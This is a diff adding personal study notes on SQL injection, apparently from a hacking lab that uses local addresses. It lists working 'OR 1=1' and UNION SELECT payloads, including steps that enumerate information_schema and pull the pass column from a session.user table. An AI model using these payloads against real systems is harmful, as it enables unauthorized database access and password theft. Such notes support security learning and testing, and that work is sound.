@@ -71,3 +71,25 @@ Select product from item where id = $select limit 1;
 
 server side query becomes:
 select product from item where id = 1 or 1=1; # limit 1;
+
+11 http://127.0.0.1:5555/Union.html on IP 10.208.50.61:80
+ 12 
+ 13 # SQL Injection 4 steps (POST)
+ 14 #       1. Identify Vulnerable field(s)
+ 15 #       'OR 1='1
+ 16 #       Audi'OR 1= '1
+ 17 #       2. Identify the number of columns
+ 18 #       Audi' UNION SELECT 1,2,3,4#(number of columns)
+ 19 #       3. Inject Golden Statement
+ 20 #                          Column_name,column_name,column_name     from     database.table
+ 21 #       Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_schema.columns #
+ 22 #       4. Craft queries
+ 23 #       Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_schema.columns #
+ 24 #       Duplicate tab for ease of access
+ 25 #       shows only databases
+ 26 #       Audi' UNION SELECT table_schema,2,3,4,5 FROM Information_schema.columns #
+ 27 #       Identify significant database, tables, and columns
+ 28 #       session database user table contains user and pass columns
+ 29 #       Look at version
+ 30 #       Audi' UNION SELECT @@version,2,pass,4,5 FROM session.user #
+ 31 #                          column, column       database.table
